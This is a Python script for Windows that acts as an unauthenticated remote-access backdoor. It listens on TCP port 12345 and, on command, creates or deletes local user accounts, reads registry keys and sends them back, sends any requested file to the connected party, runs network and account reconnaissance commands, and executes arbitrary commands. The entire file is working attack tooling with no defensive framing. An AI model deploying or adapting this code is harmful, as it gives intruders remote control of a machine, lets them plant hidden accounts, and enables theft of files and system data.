import subprocess, socket, time, struct
from _winreg import *

error_log = open("err.log","w")
def recv_data(sock):
    data_len, = struct.unpack("!I",sock.recv(4))
    return sock.recv(data_len)
    
def send_data(sock,data):
    data_len = len(data)
    sock.send(struct.pack("!I",data_len))
    sock.send(data)
    return

def get_data(sock, str_to_send):
	send_data(sock, str_to_send)
	return recv_data(sock)

def create_user(name,pwd):
	cmd_list = ["net", "user", "/add", name, pwd]
	subprocess.Popen(cmd_list,0,None,None,None,error_log)
	return 

def delete_user(name):
	cmd_list = ["net", "user", "/del", name]
	subprocess.Popen(cmd_list,0,None,None,None,error_log)
	return

def download_registry_key(root, path, sock):	
	root_dict = {"HKEY_CLASSES_ROOT":HKEY_CLASSES_ROOT, 
				"HKEY_CURRENT_USER":HKEY_CURRENT_USER,
				"HKEY_LOCAL_MACHINE":HKEY_LOCAL_MACHINE,
				"HKEY_USERS":HKEY_USERS,
				"HKEY_CURRENT_CONFIG":HKEY_CURRENT_CONFIG}
	root = root_dict[root]
	key_handle = CreateKey(root,path)
	num_subkeys, num_values, i_modified = QueryInfoKey(key_handle)
	send_data(sock, "SUBKEYS: %d\nVALUES: %d\n" % (num_subkeys, num_values))
	
	send_data(sock, "**************** SUBKEYS ****************")
	for i in range(num_subkeys):
		send_data(sock, EnumKey(key_handle,i))
		
	send_data(sock, "****************  VALUES ****************")
	for i in range(num_values):
		v_name, v_data, d_type = EnumValue(key_handle,i)
		send_data(sock, "%s : %d" % (v_name,v_data))
	send_data(sock, "DATA_COMPLETE")
	return

def download_file(file_name, sock):
	f = open(file_name, "r")
	send_data(sock, f.read())
	f.close()
	return
        
def gather_information(log_name,sock):
	cmd_list = [["ipconfig", "/all"],
				["netstat"],
				["net", "accounts"],
				["net", "file"],
				["net", "localgroup"],
				["net", "session"],
				["net", "share"],
				["net", "user"],
				["net", "view"]]
	log = open(log_name, "w")
	for i in cmd_list:
		subprocess.Popen(i,0,None,None,log,log)
	log.close()
	send_data(sock,"Log created: " + log_name)
	return
    
def execute_command(cmd, log_name):
	f = open(log_name,"w")
	try:
		subprocess.Popen(cmd,0,None,None,f,f)
	except WindowsError: 
		subprocess.Popen(cmd+".com",0,None,None,f,f) #work-around
	f.close()
	return
    
def main():
	
	
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind(("",12345))
	sock.listen(1)	
	conn_sock, conn_info = sock.accept()
	
	while True:
		cmd = get_data(conn_sock, "COMMAND: ")
		if cmd == "CU":
			create_user(get_data(conn_sock, "Name: "),get_data(conn_sock, "Password: "))
		elif cmd == "DU":
			delete_user(get_data(conn_sock, "Name: "))
		elif cmd == "DRK":
			download_registry_key(get_data(conn_sock, "Key: "),get_data(conn_sock, "Path: "),conn_sock)
		elif cmd == "DF":
			download_file(get_data(conn_sock, "File: "), conn_sock)
		elif cmd == "GI":
			gather_information(get_data(conn_sock, "Log name: "), conn_sock)
		elif cmd == "EC":
			execute_command(get_data(conn_sock, "Command: "), get_data(conn_sock, "Log name: "))
	return
    
main()
    
